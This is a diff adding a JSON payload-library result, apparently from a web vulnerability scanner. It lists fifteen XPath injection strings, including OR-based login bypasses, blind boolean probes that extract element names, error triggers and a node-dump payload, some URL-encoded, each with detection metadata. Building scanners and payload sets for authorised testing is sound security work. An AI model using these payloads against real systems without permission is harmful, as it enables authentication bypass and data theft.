@@ -1,0 +1,271 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "xpath"
+  },
+  "count": 15,
+  "results": [
+    {
+      "id": "0c9c784ada219291",
+      "payload": "admin' or '1'='1",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection with username prefix — matches admin user via OR.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "auth_bypass",
+        "or",
+        "xpath"
+      ]
+    },
+    {
+      "id": "13948ebc328abce1",
+      "payload": "' and substring(name(/*[1]),1,1)='a' and '1'='1",
+      "technique": "xpath_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind XPath — extract first char of root element name.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "extraction",
+        "xpath"
+      ]
+    },
+    {
+      "id": "1a1738063929bec2",
+      "payload": "%27%20or%20%271%27%3d%271",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "URL-encoded ' or '1'='1 XPath injection.",
+      "source": "ensphere",
+      "tags": [
+        "or",
+        "url_encoded",
+        "xpath"
+      ]
+    },
+    {
+      "id": "1e8f580e20ba6fb9",
+      "payload": "') or count(//*)\u003e0 or ('",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection using count() function — always true for non-empty XML.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "count",
+        "xpath"
+      ]
+    },
+    {
+      "id": "448bb154971e2874",
+      "payload": "' and string-length(name(/*[1]))\u003e100 and '1'='1",
+      "technique": "xpath_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind XPath — false condition (root name \u003e 100 chars, very unlikely).",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "false",
+        "xpath"
+      ]
+    },
+    {
+      "id": "4d985c436e82b919",
+      "payload": "' or string(//INVALID_NODE_NAME) or '",
+      "technique": "xpath_blind_error",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath error trigger — reference to non-existent node. Some engines error on invalid node queries.",
+      "source": "ensphere",
+      "tags": [
+        "error",
+        "invalid_node",
+        "xpath"
+      ]
+    },
+    {
+      "id": "5abe877b6334d699",
+      "payload": "' and 1/0 and '1'='1",
+      "technique": "xpath_blind_error",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath error trigger — division by zero.",
+      "source": "ensphere",
+      "tags": [
+        "division",
+        "error",
+        "xpath"
+      ]
+    },
+    {
+      "id": "6ca7661060986d77",
+      "payload": "' or '1'='1' or '1'='1",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double OR XPath injection — works with both single- and double-quoted contexts.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "double",
+        "or",
+        "xpath"
+      ]
+    },
+    {
+      "id": "7a044268467b9de3",
+      "payload": "' and string-length(name(/*[1]))\u003e1 and '1'='1",
+      "technique": "xpath_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind XPath — check if root element name length \u003e 1. Compare to false variant.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "root_name",
+        "xpath"
+      ]
+    },
+    {
+      "id": "87cc3684c75f3ba8",
+      "payload": "'] | //* | //x['",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection — close predicate, select all nodes, reopen predicate. Dumps all XML data.",
+      "source": "ensphere",
+      "tags": [
+        "data_extraction",
+        "select_all",
+        "xpath"
+      ]
+    },
+    {
+      "id": "8b99c705cc819304",
+      "payload": "' or '1'='1",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection — always-true OR condition to bypass authentication.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "or",
+        "xpath"
+      ]
+    },
+    {
+      "id": "8cbf390d6acf9d27",
+      "payload": "' or '1'='1",
+      "technique": "xpath_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection via JSON body.",
+      "source": "ensphere",
+      "tags": [
+        "json",
+        "or",
+        "xpath"
+      ]
+    },
+    {
+      "id": "d81d65ab8d12fa37",
+      "payload": "%27%5d%20%7c%20%2f%2f%2a%20%7c%20%2f%2fx%5b%27",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "URL-encoded '] | //* | //x[' XPath node dump.",
+      "source": "ensphere",
+      "tags": [
+        "select_all",
+        "url_encoded",
+        "xpath"
+      ]
+    },
+    {
+      "id": "e31c12b84831f8b5",
+      "payload": "' or '1'='1",
+      "technique": "xpath_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection via form body (login form).",
+      "source": "ensphere",
+      "tags": [
+        "form",
+        "or",
+        "xpath"
+      ]
+    },
+    {
+      "id": "fddd63d3df122a61",
+      "payload": "' or ''='",
+      "technique": "xpath_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XPath injection — empty string equals empty string (always true).",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "empty",
+        "or",
+        "xpath"
+      ]
+    }
+  ]
+}
